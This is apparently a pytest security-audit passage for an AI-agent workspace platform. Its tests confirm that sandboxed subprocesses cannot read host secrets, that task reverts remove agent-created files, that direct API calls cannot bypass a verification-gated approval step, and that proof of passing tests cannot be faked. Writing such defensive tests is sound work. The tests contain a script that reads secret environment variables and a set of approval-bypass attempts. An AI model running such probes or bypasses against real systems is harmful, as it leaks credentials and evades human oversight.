                    "criteria": [{"id": "crit_1", "description": "divide returns quotient", "verified": True}],
                    "allowed_files": ["calculator.py"],
                    "is_approved_by_user": True,
                },
                verification_data={
                    "task_id": str(task_id),
                    "scope_status": "CLEAN",
                    "overall_verdict": "PROVEN",
                    "all_criteria_met": True,
                    "command_runs": [],
                    "break_it_checks": [],
                },
            )
            db.add(db_task)
            await db.commit()

    asyncio.run(_setup_proven_task())

    # Approve commit when verification is PROVEN
    approve_res = client.post(
        f"{settings.API_V1_STR}/projects/{project_id}/tasks/{task_id}/approve",
        headers=headers,
        json={"action": "approve"},
    )
    assert approve_res.status_code == 200
    assert approve_res.json()["approved"] is True


@pytest.mark.asyncio
async def test_child_process_credential_isolation_cannot_access_host_keys(tmp_path: Path):
    """Security audit: Model-invoked test subprocesses cannot access host secrets or MODEL_API_KEY."""
    import os
    from app.db.models.workspace import Workspace
    from app.services.workspace.local_sandbox import LocalSandboxWorkspaceProvider

    os.environ["MODEL_API_KEY"] = "sk-super-secret-backend-model-key"
    os.environ["DATABASE_URL"] = "postgresql://superuser:secret@db.internal:5432/prod"
    os.environ["GITHUB_TOKEN"] = "ghp_super_secret_github_token"

    try:
        ws_root = tmp_path / "cred_audit_ws"
        ws_root.mkdir()
        ws = Workspace(
            id=uuid.uuid4(),
            user_id=uuid.uuid4(),
            project_id=uuid.uuid4(),
            name="cred_audit_ws",
            root_path=str(ws_root),
            host_type="local",
            status="RUNNING",
        )

        provider = LocalSandboxWorkspaceProvider(base_data_dir=str(tmp_path))

        # Command inside workspace attempting to inspect host secrets
        inspect_script = (
            "import os\n"
            "k = os.environ.get('MODEL_API_KEY')\n"
            "db = os.environ.get('DATABASE_URL')\n"
            "gh = os.environ.get('GITHUB_TOKEN')\n"
            "print(f'KEY:{k}|DB:{db}|GH:{gh}')\n"
        )
        res = await provider.execute_command(
            ws,
            ["python", "-c", inspect_script],
            timeout_seconds=10,
        )

        assert res.exit_code == 0
        assert "KEY:None|DB:None|GH:None" in res.stdout.strip()
    finally:
        os.environ.pop("MODEL_API_KEY", None)
        os.environ.pop("DATABASE_URL", None)
        os.environ.pop("GITHUB_TOKEN", None)


@pytest.mark.asyncio
async def test_safe_task_revert_difficult_cases_byte_for_byte_and_binary(tmp_path: Path):
    """Verify task recovery under difficult conditions:
    1. A pre-existing modified file is preserved byte-for-byte.
    2. A pre-existing untracked file is preserved byte-for-byte.
    3. A pre-existing binary file is preserved byte-for-byte.
    4. A task-created file is removed.
    5. A task-modified file (not pre-modified) is restored to its exact pre-task contents.
    """
    import asyncio
    from app.db.models.workspace import Workspace
    from app.services.meta_agent import _revert_task_changes
    from app.services.workspace.local_sandbox import LocalSandboxWorkspaceProvider

    ws_root = tmp_path / "difficult_revert_ws"
    ws_root.mkdir()

    # Pre-existing binary file
    binary_data = bytes([i % 256 for i in range(1024)])
    bin_file = ws_root / "asset_logo.png"
    bin_file.write_bytes(binary_data)

    # Pre-existing user modified file (with exact byte sequence including special chars)
    pre_user_text = "def calculate_tax():\n    # User WIP draft\n    return 42\n"
    pre_user_file = ws_root / "tax_calc.py"
    pre_user_file.write_text(pre_user_text, encoding="utf-8")

    # Pre-existing untracked notes file
    untracked_notes = ws_root / "dev_notes.md"
    untracked_text = "# Developer Notes\nKeep this uncommitted draft intact.\n"
    untracked_notes.write_text(untracked_text, encoding="utf-8")

    # Task created file
    task_added_file = ws_root / "malicious_added.py"
    task_added_file.write_text("import os; os.system('echo pwned')\n", encoding="utf-8")

    # Initialize a real git repo so git checkout works for tracked clean files
    init_res = await asyncio.create_subprocess_exec("git", "init", cwd=str(ws_root))
    await init_res.wait()

    # Create baseline clean file
    clean_tracked_file = ws_root / "clean_service.py"
    clean_tracked_file.write_text("class CleanService:\n    pass\n", encoding="utf-8")
    
    add_res = await asyncio.create_subprocess_exec("git", "add", "clean_service.py", cwd=str(ws_root))
    await add_res.wait()
    commit_res = await asyncio.create_subprocess_exec(
        "git", "-c", "user.name=Tester", "-c", "user.email=test@test.local",
        "commit", "-m", "Initial baseline", cwd=str(ws_root)
    )
    await commit_res.wait()

    # Now simulate agent modifying clean_service.py during task
    clean_tracked_file.write_text("class CleanService:\n    # Agent modified this\n    pass\n", encoding="utf-8")

    ws = Workspace(
        id=uuid.uuid4(),
        user_id=uuid.uuid4(),
        project_id=uuid.uuid4(),
        name="difficult_revert_ws",
        root_path=str(ws_root),
        host_type="local",
        status="RUNNING",
    )
    provider = LocalSandboxWorkspaceProvider()

    baseline = {
        "has_git": True,
        "branch": "main",
        "base_sha": "abc1234",
        "modified": {"tax_calc.py"},
        "untracked": {"dev_notes.md", "asset_logo.png"},
        "tracked": {"clean_service.py"},
    }
    file_existed_before_task = {
        "tax_calc.py": True,
        "dev_notes.md": True,
        "asset_logo.png": True,
        "clean_service.py": True,
        "malicious_added.py": False,
    }
    task_owned_files = {"malicious_added.py", "tax_calc.py", "clean_service.py"}

    # Execute task rollback
    await _revert_task_changes(
        ws_provider=provider,
        workspace=ws,
        task_owned_files=task_owned_files,
        baseline=baseline,
        file_existed_before_task=file_existed_before_task,
    )

    # 1. Binary file preserved byte-for-byte
    assert bin_file.exists()
    assert bin_file.read_bytes() == binary_data

    # 2. Pre-existing user work preserved byte-for-byte
    assert pre_user_file.exists()
    assert pre_user_file.read_text(encoding="utf-8") == pre_user_text

    # 3. Pre-existing untracked file preserved byte-for-byte
    assert untracked_notes.exists()
    assert untracked_notes.read_text(encoding="utf-8") == untracked_text

    # 4. Task-created file must be completely removed
    assert not task_added_file.exists(), "Task-created file must be unlinked"

    # 5. Clean tracked file modified by task must be restored to HEAD
    assert clean_tracked_file.exists()
    assert clean_tracked_file.read_text(encoding="utf-8") == "class CleanService:\n    pass\n"


def test_gate2_direct_api_bypass_comprehensive_matrix(client: TestClient):
    """Security audit: Gate 2 API direct call bypass attempts must be rejected by backend.
    
    Verifies that regardless of client UI state, any direct POST /projects/{id}/tasks/{id}/approve
    attempt without a proven verification verdict is blocked by HTTP 400 Bad Request.
    """
    _, token, project_id = create_user_and_project(client, "bypass_auditor")
    headers = {"Authorization": f"Bearer {token}"}

    from app.db.session import async_session_factory
    from app.db.models.task import Task
    import asyncio

    failure_scenarios = [
        ("FAILED_CHECKS", False, "CLEAN", None),
        ("SCOPE_BREACH", False, "VIOLATED", [".env"]),
        ("CORRUPT_CONTRACT", False, "VIOLATED", None),
        ("PROVEN", False, "CLEAN", None),  # verdict claim PROVEN, but all_criteria_met is False
        ("PROVEN", True, "VIOLATED", [".env"]),  # verdict claim PROVEN, but scope is VIOLATED
    ]

    for verdict, all_passed, scope_st, protected_violated in failure_scenarios:
        t_id = uuid.uuid4()

        async def _seed(v=verdict, ap=all_passed, sc=scope_st, pv=protected_violated, task_uuid=t_id):
            async with async_session_factory() as db:
                t = Task(
                    id=task_uuid,
                    project_id=uuid.UUID(project_id),
                    title=f"Bypass Test {v}",
                    prompt="Bypass Gate 2",
                    status=TaskStatus.APPROVAL_REQUIRED.value,
                    require_contract=True,
                    contract_data={
                        "task_id": str(task_uuid),
                        "summary": "Contract for bypass test",
                        "criteria": [{"id": "c1", "description": "criteria", "verified": ap}],
                        "allowed_files": ["calc.py"],
                        "is_approved_by_user": True,
                    },
                    verification_data={
                        "task_id": str(task_uuid),
                        "overall_verdict": v,
                        "all_criteria_met": ap,
                        "scope_status": sc,
                        "protected_files_violated": pv or [],
                        "command_runs": [],
                        "break_it_checks": [],
                    },
                )
                db.add(t)
                await db.commit()

        asyncio.run(_seed())

        # Direct HTTP bypass attempt
        res = client.post(
            f"{settings.API_V1_STR}/projects/{project_id}/tasks/{t_id}/approve",
            headers=headers,
            json={"action": "approve"},
        )
        assert res.status_code == 400, f"Expected 400 for scenario ({verdict}, {all_passed}, {scope_st}), got {res.status_code}"
        assert "Gate 2 Commit Blocked" in res.json()["detail"]


def test_evidence_integrity_rejects_simulated_proof(tmp_path: Path):
    """Evidence integrity: Verify that VerificationRunner produces real command records with exit codes
    and deterministic probes, and cannot manufacture PROVEN without passing allowlisted tests.
    """
    import asyncio
    from app.db.models.workspace import Workspace
    from app.services.verification_runner import VerificationRunner

    ws_root = tmp_path / "evidence_ws"
    ws_root.mkdir()
    calc_file = ws_root / "calculator.py"
    calc_file.write_text(
        "def add(a, b):\n    return a + b\n\n"
        "def divide(a, b):\n    if b == 0:\n        raise ValueError('Cannot divide by zero')\n    return a / b\n",
        encoding="utf-8",
    )

    # Write separate test files to avoid shell semicolon operator restrictions
    fail_test_file = ws_root / "test_fail.py"
    fail_test_file.write_text("import calculator\nassert calculator.divide(10, 2) == 999\n", encoding="utf-8")

    pass_test_file = ws_root / "test_pass.py"
    pass_test_file.write_text("import calculator\nassert calculator.divide(10, 2) == 5.0\n", encoding="utf-8")

    ws = Workspace(
        id=uuid.uuid4(),
        user_id=uuid.uuid4(),
        project_id=uuid.uuid4(),
        name="evidence_ws",
        root_path=str(ws_root),
        host_type="local",
        status="RUNNING",
    )

    runner = VerificationRunner()

    # 1. Failing test command case
    failing_contract = TaskContract(
        task_id=uuid.uuid4(),
        summary="Calculator Task",
        criteria=[AcceptanceCriterion(id="c1", description="Valid divide")],
        allowed_files=["calculator.py", "test_fail.py"],
        test_commands=["python test_fail.py"],
    )
    failing_task = Task(
        id=failing_contract.task_id,
        project_id=ws.project_id,
        title="Failing Test Task",
        prompt="calc",
        status=TaskStatus.RUNNING.value,
        contract_data=failing_contract.model_dump(mode="json"),
    )

    evidence_fail = asyncio.run(runner.run_verification(failing_task, ws, task_owned_files={"calculator.py"}))
    assert evidence_fail.overall_verdict == "FAILED_CHECKS"
    assert evidence_fail.all_criteria_met is False
    assert len(evidence_fail.command_runs) == 1
    assert evidence_fail.command_runs[0].exit_code != 0

    # 2. Passing case with real exit code 0
    passing_contract = TaskContract(
        task_id=uuid.uuid4(),
        summary="Calculator Task",
        criteria=[AcceptanceCriterion(id="c1", description="Valid divide")],
        allowed_files=["calculator.py", "test_pass.py"],
        test_commands=["python test_pass.py"],
    )
    passing_task = Task(
        id=passing_contract.task_id,
        project_id=ws.project_id,
        title="Passing Test Task",
        prompt="calc",
        status=TaskStatus.RUNNING.value,
        contract_data=passing_contract.model_dump(mode="json"),
    )

    evidence_pass = asyncio.run(runner.run_verification(passing_task, ws, task_owned_files={"calculator.py"}))
    assert evidence_pass.overall_verdict == "PROVEN"
    assert evidence_pass.all_criteria_met is True
    assert evidence_pass.command_runs[0].exit_code == 0




